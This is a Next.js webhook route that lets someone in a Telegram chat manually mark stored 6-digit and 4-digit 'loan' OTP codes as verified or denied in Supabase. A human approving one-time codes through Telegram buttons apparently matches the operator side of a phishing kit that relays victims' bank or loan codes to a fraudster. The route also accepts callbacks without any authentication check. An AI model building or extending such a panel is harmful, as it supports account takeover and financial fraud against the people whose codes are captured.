import { createClient } from '@/lib/supabase/server';

export async function POST(request: Request) {
  try {
    const update = await request.json();
    console.log('[v0] Telegram webhook received:', JSON.stringify(update));

    if (!update.callback_query) {
      console.log('[v0] No callback query found');
      return Response.json({ ok: true });
    }

    const callbackQuery = update.callback_query;
    const data = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    console.log('[v0] Telegram callback data:', data);

    const supabase = await createClient();

    let newStatus = 'pending';
    let recordId = null;
    let tableType = null;

    // Parse callback data to get record ID and table type
    if (data.startsWith('accept_otp_')) {
      newStatus = 'verified';
      recordId = data.replace('accept_otp_', '');
      tableType = 'otp_verifications'; // 6-digit OTP
    } else if (data.startsWith('deny_otp_')) {
      newStatus = 'denied';
      recordId = data.replace('deny_otp_', '');
      tableType = 'otp_verifications'; // 6-digit OTP
    } else if (data.startsWith('accept_loan_otp_')) {
      newStatus = 'verified';
      recordId = data.replace('accept_loan_otp_', '');
      tableType = 'loan_otp_verifications'; // 4-digit OTP
    } else if (data.startsWith('deny_loan_otp_')) {
      newStatus = 'denied';
      recordId = data.replace('deny_loan_otp_', '');
      tableType = 'loan_otp_verifications'; // 4-digit OTP
    }

    console.log('[v0] Parsed - recordId:', recordId, 'newStatus:', newStatus, 'tableType:', tableType);

    if (!recordId || !tableType) {
      console.log('[v0] No record ID or table type found');
      return Response.json({ ok: true });
    }

    // Update the appropriate OTP record in Supabase
    console.log('[v0] Updating Supabase table:', tableType, 'with status:', newStatus);
    const { error } = await supabase
      .from(tableType)
      .update({ status: newStatus })
      .eq('id', recordId);

    if (error) {
      console.error('[v0] Supabase update error:', error);
      return Response.json({ ok: false });
    }

    console.log('[v0] Supabase update successful');

    // Update the Telegram button to show the final status
    if (botToken && chatId) {
      const statusEmoji = newStatus === 'verified' ? '✅' : '❌';
      const statusText = newStatus === 'verified' ? 'Verified' : 'Denied';

      console.log('[v0] Updating Telegram button to:', statusText);

      await fetch(`https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: `${statusEmoji} ${statusText}`,
                  callback_data: `final_${newStatus}`,
                },
              ],
            ],
          },
        }),
      });

      // Send answer to Telegram to remove the loading state from button
      console.log('[v0] Sending callback answer');
      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: callbackQuery.id,
          text: `${tableType === 'otp_verifications' ? '6-digit' : '4-digit'} OTP ${statusText}`,
          show_alert: false,
        }),
      });
    }

    console.log('[v0] Webhook processing complete');
    return Response.json({ ok: true });
  } catch (error) {
    console.error('[v0] Telegram webhook error:', error);
    return Response.json({ ok: false });
  }
}
